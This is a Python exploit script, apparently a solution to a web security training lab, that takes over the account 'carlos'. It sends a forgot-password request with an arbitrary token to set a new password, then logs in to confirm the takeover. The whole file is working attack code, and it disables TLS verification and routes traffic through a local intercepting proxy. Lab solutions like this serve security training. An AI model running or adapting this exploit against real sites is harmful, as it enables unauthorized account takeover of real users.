import urllib3
import requests
import sys
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def reset_carlos_account(s,url):
    #Changing password
    forget_path = url + '/forgot-password?temp-forgot-password-token=x'
    forget_data = {'temp-forgot-password-token':'x','username':'carlos','new-password-1':'Ninja','new-password-2':'Ninja'}
    s.post(forget_path,data=forget_data,allow_redirects=False,verify=False,proxies=proxies)
    print("(+) Password changed to Ninja, trying to login...")

    #trying to login as carlos
    login_path = url + '/login'
    login_data = {'username':'carlos','password':'Ninja'}
    res = s.post(login_path, data=login_data,verify=False,proxies=proxies)

    #confirming exploit worked
    if "Log out" in res.text:
        print('(+) Login Confirmed')
        print('(+) Password successfully changed to "Ninja"')
    else:
        print("(-) Exploit failed..")
        sys.exit(-1)


def main():
    if len(sys.argv) != 2:
        print("(+) Usages: %s <url>" %sys.argv[0])
        print("(+) Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    s = requests.session()
    print("(+) Changing carlos password....")
    reset_carlos_account(s,url)

if __name__ == "__main__":
    main()